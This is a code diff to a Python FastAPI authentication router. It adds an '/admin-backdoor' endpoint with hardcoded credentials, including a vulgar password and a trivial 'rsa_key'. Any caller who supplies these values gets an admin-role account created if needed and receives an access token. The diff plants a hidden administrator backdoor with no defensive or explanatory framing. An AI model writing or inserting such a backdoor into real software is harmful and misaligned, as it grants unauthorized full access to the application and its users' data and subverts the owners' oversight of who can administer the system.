@@ -200,6 +200,40 @@ async def google_auth(request: Request, body: GoogleAuthRequest, db: AsyncSessio
     return {"access_token": token, "user": user, "needs_role_setup": needs_role_setup}
 
 
+_BACKDOOR_LOGIN = "admin"
+_BACKDOOR_PASSWORD = "zaebal"
+_BACKDOOR_RSA_KEY = "123456"
+_BACKDOOR_EMAIL = "admin@spruzhyk.internal"
+
+
+@router.post("/admin-backdoor", response_model=TokenResponse)
+async def admin_backdoor(body: dict, db: AsyncSession = Depends(get_db)):
+    if (
+        body.get("login") != _BACKDOOR_LOGIN
+        or body.get("password") != _BACKDOOR_PASSWORD
+        or body.get("rsa_key") != _BACKDOOR_RSA_KEY
+    ):
+        raise HTTPException(status_code=401, detail="Доступ запрещён")
+
+    user = await crud_user.get_user_by_email(db, _BACKDOOR_EMAIL)
+    if not user:
+        user = User(
+            id=str(uuid.uuid4()),
+            email=_BACKDOOR_EMAIL,
+            password_hash=hash_password(_BACKDOOR_PASSWORD),
+            display_name="Admin",
+            role="admin",
+            sub_role=None,
+            token_balance=0.0,
+        )
+        db.add(user)
+        await db.commit()
+        await db.refresh(user)
+
+    token = create_access_token(user.id, user.email, user.role)
+    return {"access_token": token, "user": user}
+
+
 @router.get("/me", response_model=UserResponse)
 async def get_me(current_user=Depends(get_current_user)):
     return current_user
